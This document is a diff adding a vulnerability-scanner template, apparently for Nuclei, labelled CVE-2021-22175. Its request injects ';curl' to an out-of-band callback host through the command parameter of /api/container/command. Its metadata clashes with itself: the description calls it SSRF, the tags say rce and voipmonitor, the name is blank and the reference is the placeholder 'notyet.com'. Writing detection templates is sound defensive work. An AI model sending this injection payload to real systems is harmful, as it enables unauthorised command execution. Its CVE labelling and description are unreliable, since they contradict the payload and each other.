@@ -1,0 +1,24 @@
+id: CVE-2021-22175
+
+info:
+  name: 
+  author: osamahamad
+  severity: critical
+  description: Unauthenticated SSRF on some versions when internal webhook requests enabled
+  tags: cve,cve2021,rce,voipmonitor
+  reference: https://notyet.com
+
+requests:
+  - raw:
+      - |
+        GET /api/container/command?container=&command=;curl%20http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
